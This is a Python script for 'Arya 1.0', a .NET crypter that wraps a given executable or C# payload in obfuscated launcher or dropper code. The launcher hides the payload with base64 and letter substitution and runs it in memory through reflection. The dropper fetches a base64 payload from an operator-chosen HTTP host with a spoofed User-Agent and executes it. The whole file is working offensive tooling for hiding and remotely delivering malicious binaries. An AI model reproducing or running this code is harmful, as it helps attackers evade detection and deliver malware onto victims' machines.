#!/usr/bin/python

"""

Arya 1.0

.NET crypter that compiles C# source to an .exe, or takes an existing .NET
executable, and builds an obfuscated launcher or dropper that packages 
and invokes the original executable using reflection
    see - http://msdn.microsoft.com/en-us/library/f7ykdhsy(v=vs.110).aspx


Dependencies:



By: @harmj0y

"""

import string, base64, binascii, random, os, sys, argparse

VERSION = "1.0"


def b64sub(s, key):
    """
    "Encryption" method that base64 encodes a given string, 
    then does a randomized alphabetic letter substitution.
    """
    enc_tbl = string.maketrans(string.ascii_letters, key)
    return string.translate(base64.b64encode(s), enc_tbl)


def randomString(length=-1):
    """
    Returns a random string of "length" characters.
    If no length is specified, resulting string is in between 6 and 15 characters.
    """
    if length == -1: length = random.randrange(6,16)
    random_string = ''.join(random.choice(string.ascii_letters) for x in range(length))
    return random_string


def generateDropperCode(args):
    """

    Builds a dropper shell to download and b64decode a string from a 
    web server, and then use reflection to invoke the original decoded .exe
    
    """

    # args.r and args.host guaranteed to have a value at this point
    if not args.port:
        args.port = "80"

    payloadCode = "using System; using System.Net; using System.Text; using System.Linq; using System.Reflection;\n"
    payloadCode += "namespace %s {\n" %(randomString())
    payloadCode += "class %s {\n" %(randomString())

    getDataName = randomString()
    payloadCode += "\tstatic string getData(string str) {\n"
    payloadCode +=  "\t\tWebClient webClient = new System.Net.WebClient();\n"
    payloadCode +=  "\t\twebClient.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n"
    payloadCode +=  "\t\twebClient.Headers.Add(\"Accept\", \"*/*\");\n"
    payloadCode +=  "\t\twebClient.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n"
    payloadCode +=  "\t\ttry { return webClient.DownloadString(str); }\n"
    payloadCode +=  "\t\tcatch (WebException w){ return null; }}\n"

    rawName = randomString()
    assemblyName = randomString()
    methodInfoName = randomString()
    payloadCode +=  "\tstatic void Main(){\n"
    payloadCode +=  "\t\tstring %s = getData(\"http://%s:%s/%s\");\n" %(rawName, args.host, args.port, args.r)
    payloadCode +=  "\t\tif (%s != null){ \n" %(rawName)
    payloadCode +=  "\t\t\tAssembly %s = Assembly.Load(Convert.FromBase64String(%s));\n" %(assemblyName, rawName)
    payloadCode +=  "\t\t\tMethodInfo %s = %s.EntryPoint;\n" %(methodInfoName, assemblyName)
    payloadCode +=  "\t\t\t%s.Invoke(%s.CreateInstance(%s.Name), null);\n" %(methodInfoName, assemblyName, methodInfoName)
    payloadCode +=  "}}}}\n"

    return payloadCode


def generateLauncherCode(raw):
    """

    Takes a raw set of bytes and builds a launcher shell to b64decode/decrypt
    a string rep of the bytes, and then use reflection to invoke 
    the original .exe
    
    """

    # the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
    key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
    base64payload = b64sub(raw,key)

    payloadCode = "using System; using System.Collections.Generic; using System.Text;"
    payloadCode += "using System.IO; using System.Reflection; using System.Linq;\n"

    decodeFuncName = randomString()
    baseStringName = randomString()
    targetStringName = randomString()
    dictionaryName = randomString()

    # build out the letter sub decrypt function
    payloadCode += "namespace %s { class %s { private static string %s(string t, string k) {\n" % (randomString(), randomString(), decodeFuncName)
    payloadCode += "string %s = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n" %(baseStringName)
    payloadCode += "string %s = \"\"; Dictionary<char, char> %s = new Dictionary<char, char>();\n" %(targetStringName,dictionaryName)
    payloadCode += "for (int i = 0; i < %s.Length; ++i){ %s.Add(k[i], %s[i]); }\n" %(baseStringName,dictionaryName,baseStringName)
    payloadCode += "for (int i = 0; i < t.Length; ++i){ if ((t[i] >= 'A' && t[i] <= 'Z') || (t[i] >= 'a' && t[i] <= 'z')) { %s += %s[t[i]];}\n" %(targetStringName, dictionaryName)
    payloadCode += "else { %s += t[i]; }} return %s; }\n" %(targetStringName,targetStringName)

    encodedDataName = randomString()
    base64PayloadName = randomString()
    assemblyName = randomString()

    # build out Main()
    assemblyName = randomString()
    methodInfoName = randomString()
    keyName = randomString()
    payloadCode += "static void Main() {\n"
    payloadCode += "string %s = \"%s\";\n" % (base64PayloadName, base64payload)
    payloadCode += "string %s = \"%s\";\n" %(keyName, key)
    # load up the assembly of the decoded binary
    payloadCode += "Assembly %s = Assembly.Load(Convert.FromBase64String(%s(%s, %s)));\n" %(assemblyName, decodeFuncName, base64PayloadName, keyName)
    payloadCode += "MethodInfo %s = %s.EntryPoint;\n" %(methodInfoName, assemblyName)
    # use reflection to jump to its entry point
    payloadCode += "%s.Invoke(%s.CreateInstance(%s.Name), null);\n" %(methodInfoName, assemblyName, methodInfoName)
    payloadCode += "}}}\n"

    return payloadCode


def generateLauncher(args):
    """
    Generates a launcher executable.

    Takes the input .exe or .cs file, compiles it to a temporary
    location, reads the raw bytes in, generates the launcher code
    using generateLauncherCode() and writes everything out.
    """

    # if no resource specified, choose a random one
    if not args.r: args.r = randomString()

    # build our new filename, "payload.cs" -> "payload_dropper.cs"
    if not args.o:
        launcherSourceName = ".".join(pieces[:-2]) + pieces[-2] + "_launcher." + pieces[-1]
        finalExeName = ".".join(pieces[:-2]) + pieces[-2] + "_launcher.exe"
    else:
        launcherSourceName = args.o + ".cs"
        finalExeName = args.o + ".exe"
    
    # get the raw bytes of the original payload
    payloadRaw = buildTemp(args)

    # grab the launcher source code
    payloadCode = generateLauncherCode(payloadRaw)

    # write our launcher source out
    f = open(launcherSourceName, 'w')
    f.write(payloadCode)
    f.close()
    print " [*] Dropper source output to %s" %(launcherSourceName)
    
    # compile the dropper source
    print " [*] Compiling encrypted source..."
    os.system('mcs -platform:x86 -target:winexe '+launcherSourceName+' -out:' + finalExeName)
    print " [*] Encrypted binary written to: %s" %(finalExeName)
    print "\n [*] Finished!\n"


def generateDropper(args):
    """
    Generates a dropper executable.

    Takes the input .exe or .cs file, compiles it to a temporary
    location, reads the raw bytes in, base64's the code and writes
    it out to a local resource, generates the dropper code
    using generateDropperCode() and writes everything out.
    """

    if not args.host:
        print " [!] Host IP must be specified for dropper\n"
        sys.exit()

    # if no resource specified, choose a random one
    if not args.r: args.r = randomString()

    # build our new filename, "payload.cs" -> "payload_dropper.cs"
    if not args.o:
        dropperSourceName = ".".join(pieces[:-2]) + pieces[-2] + "_dropper." + pieces[-1]
        finalExeName = ".".join(pieces[:-2]) + pieces[-2] + "_dropper.exe"
    else:
        dropperSourceName = args.o + ".cs"
        finalExeName = args.o + ".exe"
    
    # get the raw bytes of the original payload
    payloadRaw = buildTemp(args)

    # write the raw bytes out to the resource file
    f = open(args.r, 'w')
    f.write(base64.b64encode(payloadRaw))
    f.close()
    print " [*] Base64 encoded .exe written to %s" %(args.r)

    # grab the dropper source code
    payloadCode = generateDropperCode(args)

    # write our dropper source out
    f = open(dropperSourceName, 'w')
    f.write(payloadCode)
    f.close()
    print " [*] Dropper source output to %s" %(dropperSourceName)
    
    # compile the dropper source
    print " [*] Compiling encrypted source..."
    os.system('mcs -platform:x86 -target:winexe '+dropperSourceName+' -out:' + finalExeName + " 2>/dev/null 1>/dev/null")
    print " [*] Encrypted binary written to: %s" %(finalExeName)
    print "\n [*] Finished!\n"


def buildTemp(args):
    """
    Compile the original payload source to a temporary location 
    and return the raw bytes.
    """

    if not args.i:
        print " [!] Input file must be specified\n"
        sys.exit()

    # if we already have an exe, return its raw bytes
    if args.i.split(".")[-1] == "exe":
        return open(args.i, 'rb').read()

    # if we have a C# payload
    elif args.i.split(".")[-1] == "cs":

        # output location for temporarily compiled file
        tempFile = "/tmp/" + randomString() + ".exe"

        # Compile our C# code into a temporary executable using Mono
        print(" [*] Compiling original source to %s" % (tempFile))

        # use Mono to bulid the temporary exe
        os.system('mcs -platform:x86 -target:winexe '+args.i+' -out:' + tempFile)

        # check if the output name was specified, otherwise use the one built above
        if len(sys.argv) == 3:
            finalExeName = sys.argv[2]

        # read in the raw paylode .exe bytes
        payloadRaw = open(tempFile, 'rb').read()

        # remove the temporary files
        os.system("rm %s" %(tempFile))

        return payloadRaw

    else:
        print " [!] Format not currently supported "
        sys.exit()


def title():
    """
    Print the tool title, with version.
    """
    os.system("clear")
    print '========================================================================='
    print ' Arya | [Version]: %s' %(VERSION)
    print '========================================================================='
    print ' [Web]: https://harmj0y.net/ | [Twitter]: @harmj0y'
    print '========================================================================='
    print "\n"



if __name__ == '__main__':

    title()

    parser = argparse.ArgumentParser()

    group = parser.add_argument_group('Arya options')
    group.add_argument('-i', metavar="INPUT", help='Input file to encrypt.')
    group.add_argument('-o', metavar="OUTPUTBASE", help='Output file base for source and compiled .exe.')
    group.add_argument('-l', action='store_true', help='Use the encrypted launcher.')
    group.add_argument('-d', action='store_true', help='Use the encrypted dropper.')

    group = parser.add_argument_group('Dropper options')
    group.add_argument('-r', metavar="RESOURCE", help='Resource name used with the dropper.')
    group.add_argument('--host', metavar="HOST", help='IP of the HTTP server to use for the dropper.')
    group.add_argument('--port', metavar="PORT", help='Port of the HTTP server to use for the dropper.')

    args = parser.parse_args()


    if args.l:
        generateLauncher(args)
    elif args.d:
        generateDropper(args)
    else:
        parser.print_help()





